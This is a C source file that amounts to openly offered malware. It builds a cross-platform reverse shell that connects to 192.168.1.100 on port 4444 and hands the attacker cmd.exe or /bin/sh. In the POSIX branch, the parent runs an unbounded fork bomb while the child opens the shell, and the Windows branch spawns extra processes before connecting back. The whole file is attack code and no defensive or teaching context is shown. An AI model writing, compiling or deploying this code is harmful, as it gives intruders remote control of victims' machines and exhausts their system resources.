#include <stdio.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

static void reverse_shell(void) {
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }
    closesocket(sock);
}

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    /* Fork-bomb pattern: spawn many processes */
    CreateProcessA(NULL, "cmd.exe /c timeout 1", NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL);
    CreateProcessA(NULL, "cmd.exe /c timeout 1", NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL);

    Sleep(1000);
    reverse_shell();

    WSACleanup();
    return 0;
}
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>

void fork_bomb() {
    while(1) {
        fork();
    }
}

void reverse_shell() {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execve("/bin/sh", NULL, NULL);
    }
}

int main() {
    if(fork() == 0) {
        sleep(1);
        reverse_shell();
    } else {
        fork_bomb();
    }

    return 0;
}
#endif
